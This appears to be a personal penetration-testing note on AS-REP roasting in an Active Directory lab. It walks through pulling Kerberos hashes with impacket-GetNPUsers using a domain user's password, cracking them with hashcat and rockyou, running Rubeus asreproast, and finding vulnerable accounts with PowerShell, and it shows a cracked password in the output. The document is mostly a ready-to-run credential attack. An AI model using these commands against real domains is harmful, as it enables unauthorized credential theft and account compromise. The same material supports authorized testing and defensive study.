# ASREP Roasting
## Impacket Method
```
impacket-GetNPUsers -outputfile asrep_hashes.txt -dc-ip 10.0.1.10 'attacklab.local/Phoebe Chillax:summer2021!'
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

Name           MemberOf  PasswordLastSet             LastLogon                   UAC
-------------  --------  --------------------------  --------------------------  --------
AsrepRoast Me            2021-08-31 23:34:05.248118  2021-09-01 00:11:29.299171  0x400200
```
Hashcat is supposed to support compressed wordlists, but it did not work for me
```
cd /usr/share/wordlists/
gzip -d rockyou.txt.gz
```
Crack the hashes
```
hashcat -m 18200 -o cracked_hash.txt asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```
### View Cracked Hashes

via Hashcat
```
hashcat -m 18200 --show asrep_hashes.txt
```
or just cat the output file
```
cat cracked_hash.txt
[SNIP]:P@ssw0rd!
```

## Rubeus Method
TODO: Finish documenting this

```
Rubeus.exe asreproast
```
Then use the same method to crack them via Hashcat

## Identify Accounts for ASREP Roasting via Powershell
TODO: Document this better
```
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
```
```
(Get-ACL "AD:$((Get-ADUser -Filter 'useraccountcontrol -band 4194304').distinguishedname)").access
```